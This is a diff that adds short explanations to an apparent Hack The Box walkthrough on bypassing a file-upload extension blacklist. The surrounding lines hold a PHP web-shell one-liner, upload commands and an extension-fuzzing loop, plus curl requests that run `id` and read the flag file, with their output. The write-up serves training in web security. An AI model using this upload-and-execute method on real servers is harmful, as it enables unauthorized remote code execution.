@@ -47,6 +47,7 @@ done > /tmp/exts.txt
 # Or use the SecLists list:
 ls ~/SecLists/Discovery/Web-Content/web-extensions.txt
 ```
+> Builds a wordlist of PHP-executable extensions to feed into ffuf or Burp Intruder. The SecLists list has a broader set if you want more coverage.
 
 ### With Burp Intruder
 1. Capture a normal upload → Send to Intruder
@@ -65,6 +66,7 @@ for ext in phtml phar pht php2 php3 php4 php5 php6 php7 inc phpt; do
   rm /tmp/sh.$ext
 done
 ```
+> Uploads the shell under each extension and prints the server response. Look for "File successfully uploaded" versus "Extension not allowed" to map what is blocked.
 
 ---
 
@@ -79,6 +81,7 @@ curl "http://TARGET/uploads/sh.phar?c=id"
 # → "uid=33(www-data)..." → executes ✅
 # → "<?php system..."     → source served, no exec ❌ → try next extension
 ```
+> Confirms whether the uploaded extension actually runs as PHP. If the raw source appears, the server accepted the file but the extension isn't mapped to a PHP handler.
 
 Some uploaded files pass the blacklist but get served as text/plain — useful for LFI chains (Section 7 of LFI module) but not direct RCE.
 
@@ -128,6 +131,7 @@ echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/sh.php
 curl -sk -X POST "http://154.57.164.72:31554/upload.php" -F "uploadFile=@/tmp/sh.php"
 # → "Extension not allowed"
 ```
+> Confirms the server is running a blacklist. The "Extension not allowed" message means `.php` is blocked — try alternate extensions next.
 
 ### Step 2 — Fuzz alternative extensions
 ```bash
@@ -138,6 +142,7 @@ for ext in phtml phar pht php2 php3 php4 php5 php6 inc phpt; do
   echo "[$ext] $resp"
 done
 ```
+> Iterates through alternate PHP-executable extensions. Each response reveals whether that extension passes the blacklist.
 
 Results:
 ```
@@ -164,6 +169,7 @@ curl -sk "http://154.57.164.72:31554/profile_images/sh.phar?cmd=id"
 curl -sk "http://154.57.164.72:31554/profile_images/sh.phar?cmd=cat+/flag.txt"
 # → HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
 ```
+> Verifies code execution with `id` first, then reads the flag. The `www-data` user output confirms the PHP handler fired.
 
 **Flag:** `HTB{1_c4n_n3v3r_b3_bl4ckl1573d}`
 
